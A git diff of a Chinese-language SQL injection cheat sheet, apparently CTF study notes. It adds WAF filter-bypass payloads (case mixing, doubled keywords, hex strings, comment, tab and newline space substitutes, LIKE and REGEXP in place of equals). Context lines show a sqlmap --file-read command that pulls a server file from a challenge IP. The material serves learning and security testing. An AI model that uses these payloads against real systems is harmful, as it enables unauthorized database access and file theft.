@@ -406,14 +406,81 @@ python sqlmap.py -u http://x.com --data="name=a&pass=123456aaa"
 rm -rf /root/.local/share/sqlmap/output/*.*.*.*
 ```
 
-#### 服务端文件读取
+##### 服务端文件读取
 
 ```bash
 python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&passwd=a&age=1&blog=baidu.com" --file-read "/var/www/html/flag.php"
 # 重点是 --file-read 参数
 ```
 
+#### 过滤绕过
+
+##### 字符串过滤
+
+###### 大小写绕过
+
+waf 过滤了关键字 select，可以尝试使用 Select 等绕过
+
+###### 双写关键字绕过
+
+在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。 例如 select 变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求
+
+###### 十六进制绕过
+
+mysql支持字符串采用十六进制形式。 `select * from users where username = 0x7465737431;`
+
+##### 空格过滤绕过
+
+###### 注释符
+
+可以采用mysql中的多行注释符`/**/` 
+
+```sql
+select/**/username/**/from/**/userinfo;
+```
+
+###### 括号()
+
+```sql
+select(username)from(userinfo);
+```
+
+###### tab(%09)
+
+```sql
+select%09username%09from%09userinfo;
+```
+
+###### 回车(url编码中的%0a)
+
+```sql
+select%0ausername%0afrom%0auserinfo;
+```
+
+##### 等号过滤
+
+###### like关键字
+
+不加通配符的 `like` 执行的效果和 `=` 一致，所以可以用来绕过
+
+```sql
+select username from userinfo where password like '123456';
+```
+
+###### regexp关键字
+
+MySQL中使用 REGEXP 操作符来进行正则表达式匹配
+
+```sql
+select username from userinfo where password regexp'^123456$';
+```
+
+##### 过滤函数绕过
+
+ascii('a') => ord('a')
+
 #### 万能密码表
+
 - 有时候 sqlmap 无法使用，该方法可以登录进去
 
 ##### 通用方法
